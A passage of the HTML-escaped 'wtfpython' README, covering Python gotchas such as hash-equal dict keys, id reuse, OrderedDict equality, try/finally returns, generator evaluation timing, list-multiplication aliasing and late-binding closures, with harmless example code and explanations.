&#39;Ruby&#39;}&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[5] = &#34;Python&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict&#xA;{5.0: &#39;Python&#39;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So how can we update the key to &lt;code&gt;5&lt;/code&gt; (instead of &lt;code&gt;5.0&lt;/code&gt;)? We can&#39;t actually do this update in place, but what we can do is first delete the key (&lt;code&gt;del some_dict[5.0]&lt;/code&gt;), and then set it (&lt;code&gt;some_dict[5]&lt;/code&gt;) to get the integer &lt;code&gt;5&lt;/code&gt; as the key instead of floating &lt;code&gt;5.0&lt;/code&gt;, though this should be needed in rare cases.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;How did Python find &lt;code&gt;5&lt;/code&gt; in a dictionary containing &lt;code&gt;5.0&lt;/code&gt;? Python does this in constant time without having to scan through every item by using hash functions. When Python looks up a key &lt;code&gt;foo&lt;/code&gt; in a dict, it first computes &lt;code&gt;hash(foo)&lt;/code&gt; (which runs in constant-time). Since in Python it is required that objects that compare equal also have the same hash value (&lt;a href=&#34;https://docs.python.org/3/reference/datamodel.html#object.__hash__&#34;&gt;docs&lt;/a&gt; here), &lt;code&gt;5&lt;/code&gt;, &lt;code&gt;5.0&lt;/code&gt;, and &lt;code&gt;5 + 0j&lt;/code&gt; have the same hash value.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; 5 == 5.0 == 5 + 0j&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; hash(5) == hash(5.0) == hash(5 + 0j)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The inverse is not necessarily true: Objects with equal hash values may themselves be unequal. (This causes what&#39;s known as a &lt;a href=&#34;https://en.wikipedia.org/wiki/Collision_(computer_science)&#34;&gt;hash collision&lt;/a&gt;, and degrades the constant-time performance that hashing usually provides.)&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Deep down, we&#39;re all the same.&lt;/h3&gt; &#xA;&lt;!-- Example ID: 8f99a35f-1736-43e2-920d-3b78ec35da9b ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class WTF:&#xA;  pass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; WTF() == WTF() # two different instances can&#39;t be equal&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; WTF() is WTF() # identities are also different&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; hash(WTF()) == hash(WTF()) # hashes _should_ be different as well&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; id(WTF()) == id(WTF())&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When &lt;code&gt;id&lt;/code&gt; was called, Python created a &lt;code&gt;WTF&lt;/code&gt; class object and passed it to the &lt;code&gt;id&lt;/code&gt; function. The &lt;code&gt;id&lt;/code&gt; function takes its &lt;code&gt;id&lt;/code&gt; (its memory location), and throws away the object. The object is destroyed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;When we do this twice in succession, Python allocates the same memory location to this second object as well. Since (in CPython) &lt;code&gt;id&lt;/code&gt; uses the memory location as the object id, the id of the two objects is the same.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So, the object&#39;s id is unique only for the lifetime of the object. After the object is destroyed, or before it is created, something else can have the same id.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;But why did the &lt;code&gt;is&lt;/code&gt; operator evaluate to &lt;code&gt;False&lt;/code&gt;? Let&#39;s see with this snippet.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class WTF(object):&#xA;  def __init__(self): print(&#34;I&#34;)&#xA;  def __del__(self): print(&#34;D&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; WTF() is WTF()&#xA;I&#xA;I&#xA;D&#xA;D&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; id(WTF()) == id(WTF())&#xA;I&#xA;D&#xA;I&#xA;D&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;As you may observe, the order in which the objects are destroyed is what made all the difference here.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Disorder within order *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 91bff1f8-541d-455a-9de4-6cd8ff00ea66 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from collections import OrderedDict&#xA;&#xA;dictionary = dict()&#xA;dictionary[1] = &#39;a&#39;; dictionary[2] = &#39;b&#39;;&#xA;&#xA;ordered_dict = OrderedDict()&#xA;ordered_dict[1] = &#39;a&#39;; ordered_dict[2] = &#39;b&#39;;&#xA;&#xA;another_ordered_dict = OrderedDict()&#xA;another_ordered_dict[2] = &#39;b&#39;; another_ordered_dict[1] = &#39;a&#39;;&#xA;&#xA;class DictWithHash(dict):&#xA;    &#34;&#34;&#34;&#xA;    A dict that also implements __hash__ magic.&#xA;    &#34;&#34;&#34;&#xA;    __hash__ = lambda self: 0&#xA;&#xA;class OrderedDictWithHash(OrderedDict):&#xA;    &#34;&#34;&#34;&#xA;    An OrderedDict that also implements __hash__ magic.&#xA;    &#34;&#34;&#34;&#xA;    __hash__ = lambda self: 0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; dictionary == ordered_dict # If a == b&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; dictionary == another_ordered_dict # and b == c&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; ordered_dict == another_ordered_dict # then why isn&#39;t c == a ??&#xA;False&#xA;&#xA;# We all know that a set consists of only unique elements,&#xA;# let&#39;s try making a set of these dictionaries and see what happens...&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; len({dictionary, ordered_dict, another_ordered_dict})&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;TypeError: unhashable type: &#39;dict&#39;&#xA;&#xA;# Makes sense since dict don&#39;t have __hash__ implemented, let&#39;s use&#xA;# our wrapper classes.&#xA;&amp;gt;&amp;gt;&amp;gt; dictionary = DictWithHash()&#xA;&amp;gt;&amp;gt;&amp;gt; dictionary[1] = &#39;a&#39;; dictionary[2] = &#39;b&#39;;&#xA;&amp;gt;&amp;gt;&amp;gt; ordered_dict = OrderedDictWithHash()&#xA;&amp;gt;&amp;gt;&amp;gt; ordered_dict[1] = &#39;a&#39;; ordered_dict[2] = &#39;b&#39;;&#xA;&amp;gt;&amp;gt;&amp;gt; another_ordered_dict = OrderedDictWithHash()&#xA;&amp;gt;&amp;gt;&amp;gt; another_ordered_dict[2] = &#39;b&#39;; another_ordered_dict[1] = &#39;a&#39;;&#xA;&amp;gt;&amp;gt;&amp;gt; len({dictionary, ordered_dict, another_ordered_dict})&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; len({ordered_dict, another_ordered_dict, dictionary}) # changing the order&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;What is going on here?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The reason why intransitive equality didn&#39;t hold among &lt;code&gt;dictionary&lt;/code&gt;, &lt;code&gt;ordered_dict&lt;/code&gt; and &lt;code&gt;another_ordered_dict&lt;/code&gt; is because of the way &lt;code&gt;__eq__&lt;/code&gt; method is implemented in &lt;code&gt;OrderedDict&lt;/code&gt; class. From the &lt;a href=&#34;https://docs.python.org/3/library/collections.html#ordereddict-objects&#34;&gt;docs&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;Equality tests between OrderedDict objects are order-sensitive and are implemented as &lt;code&gt;list(od1.items())==list(od2.items())&lt;/code&gt;. Equality tests between &lt;code&gt;OrderedDict&lt;/code&gt; objects and other Mapping objects are order-insensitive like regular dictionaries.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The reason for this equality in behavior is that it allows &lt;code&gt;OrderedDict&lt;/code&gt; objects to be directly substituted anywhere a regular dictionary is used.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Okay, so why did changing the order affect the length of the generated &lt;code&gt;set&lt;/code&gt; object? The answer is the lack of intransitive equality only. Since sets are &#34;unordered&#34; collections of unique elements, the order in which elements are inserted shouldn&#39;t matter. But in this case, it does matter. Let&#39;s break it down a bit,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_set = set()&#xA;&amp;gt;&amp;gt;&amp;gt; some_set.add(dictionary) # these are the mapping objects from the snippets above&#xA;&amp;gt;&amp;gt;&amp;gt; ordered_dict in some_set&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; some_set.add(ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; len(some_set)&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; another_ordered_dict in some_set&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; some_set.add(another_ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; len(some_set)&#xA;1&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; another_set = set()&#xA;&amp;gt;&amp;gt;&amp;gt; another_set.add(ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; another_ordered_dict in another_set&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; another_set.add(another_ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; len(another_set)&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; dictionary in another_set&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; another_set.add(another_ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; len(another_set)&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;So the inconsistency is due to &lt;code&gt;another_ordered_dict in another_set&lt;/code&gt; being &lt;code&gt;False&lt;/code&gt; because &lt;code&gt;ordered_dict&lt;/code&gt; was already present in &lt;code&gt;another_set&lt;/code&gt; and as observed before, &lt;code&gt;ordered_dict == another_ordered_dict&lt;/code&gt; is &lt;code&gt;False&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Keep trying... *&lt;/h3&gt; &#xA;&lt;!-- Example ID: b4349443-e89f-4d25-a109-82616be9d41a ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func():&#xA;    try:&#xA;        return &#39;from_try&#39;&#xA;    finally:&#xA;        return &#39;from_finally&#39;&#xA;&#xA;def another_func(): &#xA;    for _ in range(3):&#xA;        try:&#xA;            continue&#xA;        finally:&#xA;            print(&#34;Finally!&#34;)&#xA;&#xA;def one_more_func(): # A gotcha!&#xA;    try:&#xA;        for i in range(3):&#xA;            try:&#xA;                1 / i&#xA;            except ZeroDivisionError:&#xA;                # Let&#39;s throw it here and handle it outside for loop&#xA;                raise ZeroDivisionError(&#34;A trivial divide by zero error&#34;)&#xA;            finally:&#xA;                print(&#34;Iteration&#34;, i)&#xA;                break&#xA;    except ZeroDivisionError as e:&#xA;        print(&#34;Zero division error occurred&#34;, e)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;&#39;from_finally&#39;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; another_func()&#xA;Finally!&#xA;Finally!&#xA;Finally!&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; 1 / 0&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;ZeroDivisionError: division by zero&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; one_more_func()&#xA;Iteration 0&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;When a &lt;code&gt;return&lt;/code&gt;, &lt;code&gt;break&lt;/code&gt; or &lt;code&gt;continue&lt;/code&gt; statement is executed in the &lt;code&gt;try&lt;/code&gt; suite of a &#34;try…finally&#34; statement, the &lt;code&gt;finally&lt;/code&gt; clause is also executed on the way out.&lt;/li&gt; &#xA; &lt;li&gt;The return value of a function is determined by the last &lt;code&gt;return&lt;/code&gt; statement executed. Since the &lt;code&gt;finally&lt;/code&gt; clause always executes, a &lt;code&gt;return&lt;/code&gt; statement executed in the &lt;code&gt;finally&lt;/code&gt; clause will always be the last one executed.&lt;/li&gt; &#xA; &lt;li&gt;The caveat here is, if the finally clause executes a &lt;code&gt;return&lt;/code&gt; or &lt;code&gt;break&lt;/code&gt; statement, the temporarily saved exception is discarded.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ For what?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 64a9dccf-5083-4bc9-98aa-8aeecde4f210 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_string = &#34;wtf&#34;&#xA;some_dict = {}&#xA;for i, some_dict[i] in enumerate(some_string):&#xA;    i = 10&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_dict # An indexed dict appears.&#xA;{0: &#39;w&#39;, 1: &#39;t&#39;, 2: &#39;f&#39;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;A &lt;code&gt;for&lt;/code&gt; statement is defined in the &lt;a href=&#34;https://docs.python.org/3/reference/grammar.html&#34;&gt;Python grammar&lt;/a&gt; as:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;for_stmt: &#39;for&#39; exprlist &#39;in&#39; testlist &#39;:&#39; suite [&#39;else&#39; &#39;:&#39; suite]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Where &lt;code&gt;exprlist&lt;/code&gt; is the assignment target. This means that the equivalent of &lt;code&gt;{exprlist} = {next_value}&lt;/code&gt; is &lt;strong&gt;executed for each item&lt;/strong&gt; in the iterable. An interesting example that illustrates this:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;for i in range(4):&#xA;    print(i)&#xA;    i = 10&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;0&#xA;1&#xA;2&#xA;3&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Did you expect the loop to run just once?&lt;/p&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;The assignment statement &lt;code&gt;i = 10&lt;/code&gt; never affects the iterations of the loop because of the way for loops work in Python. Before the beginning of every iteration, the next item provided by the iterator (&lt;code&gt;range(4)&lt;/code&gt; in this case) is unpacked and assigned the target list variables (&lt;code&gt;i&lt;/code&gt; in this case).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;code&gt;enumerate(some_string)&lt;/code&gt; function yields a new value &lt;code&gt;i&lt;/code&gt; (a counter going up) and a character from the &lt;code&gt;some_string&lt;/code&gt; in each iteration. It then sets the (just assigned) &lt;code&gt;i&lt;/code&gt; key of the dictionary &lt;code&gt;some_dict&lt;/code&gt; to that character. The unrolling of the loop can be simplified as:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; i, some_dict[i] = (0, &#39;w&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; i, some_dict[i] = (1, &#39;t&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; i, some_dict[i] = (2, &#39;f&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Evaluation time discrepancy&lt;/h3&gt; &#xA;&lt;!-- Example ID: 6aa11a4b-4cf1-467a-b43a-810731517e98 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;array = [1, 8, 15]&#xA;# A typical generator expression&#xA;gen = (x for x in array if array.count(x) &amp;gt; 0)&#xA;array = [2, 8, 22]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(list(gen)) # Where did the other values go?&#xA;[8]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;array_1 = [1,2,3,4]&#xA;gen_1 = (x for x in array_1)&#xA;array_1 = [1,2,3,4,5]&#xA;&#xA;array_2 = [1,2,3,4]&#xA;gen_2 = (x for x in array_2)&#xA;array_2[:] = [1,2,3,4,5]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(list(gen_1))&#xA;[1, 2, 3, 4]&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(list(gen_2))&#xA;[1, 2, 3, 4, 5]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;array_3 = [1, 2, 3]&#xA;array_4 = [10, 20, 30]&#xA;gen = (i + j for i in array_3 for j in array_4)&#xA;&#xA;array_3 = [4, 5, 6]&#xA;array_4 = [400, 500, 600]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(list(gen))&#xA;[401, 501, 601, 402, 502, 602, 403, 503, 603]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In a &lt;a href=&#34;https://wiki.python.org/moin/Generators&#34;&gt;generator&lt;/a&gt; expression, the &lt;code&gt;in&lt;/code&gt; clause is evaluated at declaration time, but the conditional clause is evaluated at runtime.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So before runtime, &lt;code&gt;array&lt;/code&gt; is re-assigned to the list &lt;code&gt;[2, 8, 22]&lt;/code&gt;, and since out of &lt;code&gt;1&lt;/code&gt;, &lt;code&gt;8&lt;/code&gt; and &lt;code&gt;15&lt;/code&gt;, only the count of &lt;code&gt;8&lt;/code&gt; is greater than &lt;code&gt;0&lt;/code&gt;, the generator only yields &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The differences in the output of &lt;code&gt;g1&lt;/code&gt; and &lt;code&gt;g2&lt;/code&gt; in the second part is due the way variables &lt;code&gt;array_1&lt;/code&gt; and &lt;code&gt;array_2&lt;/code&gt; are re-assigned values.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In the first case, &lt;code&gt;array_1&lt;/code&gt; is bound to the new object &lt;code&gt;[1,2,3,4,5]&lt;/code&gt; and since the &lt;code&gt;in&lt;/code&gt; clause is evaluated at the declaration time it still refers to the old object &lt;code&gt;[1,2,3,4]&lt;/code&gt; (which is not destroyed).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In the second case, the slice assignment to &lt;code&gt;array_2&lt;/code&gt; updates the same old object &lt;code&gt;[1,2,3,4]&lt;/code&gt; to &lt;code&gt;[1,2,3,4,5]&lt;/code&gt;. Hence both the &lt;code&gt;g2&lt;/code&gt; and &lt;code&gt;array_2&lt;/code&gt; still have reference to the same object (which has now been updated to &lt;code&gt;[1,2,3,4,5]&lt;/code&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Okay, going by the logic discussed so far, shouldn&#39;t be the value of &lt;code&gt;list(gen)&lt;/code&gt; in the third snippet be &lt;code&gt;[11, 21, 31, 12, 22, 32, 13, 23, 33]&lt;/code&gt;? (because &lt;code&gt;array_3&lt;/code&gt; and &lt;code&gt;array_4&lt;/code&gt; are going to behave just like &lt;code&gt;array_1&lt;/code&gt;). The reason why (only) &lt;code&gt;array_4&lt;/code&gt; values got updated is explained in &lt;a href=&#34;https://www.python.org/dev/peps/pep-0289/#the-details&#34;&gt;PEP-289&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;Only the outermost for-expression is evaluated immediately, the other expressions are deferred until the generator is run.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ &lt;code&gt;is not ...&lt;/code&gt; is not &lt;code&gt;is (not ...)&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;!-- Example ID: b26fb1ed-0c7d-4b9c-8c6d-94a58a055c0d ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#39;something&#39; is not None&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;something&#39; is (not None)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;is not&lt;/code&gt; is a single binary operator, and has behavior different than using &lt;code&gt;is&lt;/code&gt; and &lt;code&gt;not&lt;/code&gt; separated.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;is not&lt;/code&gt; evaluates to &lt;code&gt;False&lt;/code&gt; if the variables on either side of the operator point to the same object and &lt;code&gt;True&lt;/code&gt; otherwise.&lt;/li&gt; &#xA; &lt;li&gt;In the example, &lt;code&gt;(not None)&lt;/code&gt; evaluates to &lt;code&gt;True&lt;/code&gt; since the value &lt;code&gt;None&lt;/code&gt; is &lt;code&gt;False&lt;/code&gt; in a boolean context, so the expression becomes &lt;code&gt;&#39;something&#39; is True&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ A tic-tac-toe where X wins in the first attempt!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 69329249-bdcb-424f-bd09-cca2e6705a7a ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Let&#39;s initialize a row&#xA;row = [&#34;&#34;] * 3 #row i[&#39;&#39;, &#39;&#39;, &#39;&#39;]&#xA;# Let&#39;s make a board&#xA;board = [row] * 3&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; board&#xA;[[&#39;&#39;, &#39;&#39;, &#39;&#39;], [&#39;&#39;, &#39;&#39;, &#39;&#39;], [&#39;&#39;, &#39;&#39;, &#39;&#39;]]&#xA;&amp;gt;&amp;gt;&amp;gt; board[0]&#xA;[&#39;&#39;, &#39;&#39;, &#39;&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; board[0][0]&#xA;&#39;&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; board[0][0] = &#34;X&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; board&#xA;[[&#39;X&#39;, &#39;&#39;, &#39;&#39;], [&#39;X&#39;, &#39;&#39;, &#39;&#39;], [&#39;X&#39;, &#39;&#39;, &#39;&#39;]]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We didn&#39;t assign three &lt;code&gt;&#34;X&#34;&lt;/code&gt;s, did we?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;p&gt;When we initialize &lt;code&gt;row&lt;/code&gt; variable, this visualization explains what happens in the memory&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/images/tic-tac-toe/after_row_initialized.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;And when the &lt;code&gt;board&lt;/code&gt; is initialized by multiplying the &lt;code&gt;row&lt;/code&gt;, this is what happens inside the memory (each of the elements &lt;code&gt;board[0]&lt;/code&gt;, &lt;code&gt;board[1]&lt;/code&gt; and &lt;code&gt;board[2]&lt;/code&gt; is a reference to the same list referred by &lt;code&gt;row&lt;/code&gt;)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/images/tic-tac-toe/after_board_initialized.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;We can avoid this scenario here by not using &lt;code&gt;row&lt;/code&gt; variable to generate &lt;code&gt;board&lt;/code&gt;. (Asked in &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/68&#34;&gt;this&lt;/a&gt; issue).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; board = [[&#39;&#39;]*3 for _ in range(3)]&#xA;&amp;gt;&amp;gt;&amp;gt; board[0][0] = &#34;X&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; board&#xA;[[&#39;X&#39;, &#39;&#39;, &#39;&#39;], [&#39;&#39;, &#39;&#39;, &#39;&#39;], [&#39;&#39;, &#39;&#39;, &#39;&#39;]]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Schrödinger&#39;s variable *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 4dc42f77-94cb-4eb5-a120-8203d3ed7604 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;funcs = []&#xA;results = []&#xA;for x in range(7):&#xA;    def some_func():&#xA;        return x&#xA;    funcs.append(some_func)&#xA;    results.append(some_func())  # note the function call here&#xA;&#xA;funcs_results = [func() for func in funcs]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python version):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; results&#xA;[0, 1, 2, 3, 4, 5, 6]&#xA;&amp;gt;&amp;gt;&amp;gt; funcs_results&#xA;[6, 6, 6, 6, 6, 6, 6]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The values of &lt;code&gt;x&lt;/code&gt; were different in every iteration prior to appending &lt;code&gt;some_func&lt;/code&gt; to &lt;code&gt;funcs&lt;/code&gt;, but all the functions return 6 when they&#39;re evaluated after the loop completes.&lt;/p&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; powers_of_x = [lambda x: x**i for i in range(10)]&#xA;&amp;gt;&amp;gt;&amp;gt; [f(2) for f in powers_of_x]&#xA;[512, 512, 512, 512, 512, 512, 